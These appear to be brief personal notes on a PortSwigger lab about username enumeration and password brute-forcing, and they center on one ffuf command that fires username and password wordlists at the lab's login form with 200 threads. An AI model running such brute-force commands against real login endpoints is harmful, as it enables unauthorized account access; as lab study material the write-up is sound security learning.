https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
---
**Difficulty**: EASY
**CWE-lists**:
- [[CWE-307(improper-restriction-of-excesive-authz-attempts)]]
-----

Then use it for fuzzing, the number of threads, the number after the `-t` flag, may vary from your computer, internet, processor
```sh
ffuf -u https://0a3f00e703cdf11482ceecfe00840074.web-security-academy.net/login -X POST -d "username=W1&password=W2" -w username-list.txt:W1 -w password-list.txt:W2 -ac -c -t 200
```
In this line fuff is detecting automatically a common pattern with the flag `-ac` and the username that start to appear, probably es the correct one, just wait for some clear difference between the others request. There's a name which has a clear distintion.
![[Pasted image 20250321002057.png]]
So i just bruteforce for that one then i nail it
![[Pasted image 20250321002220.png]]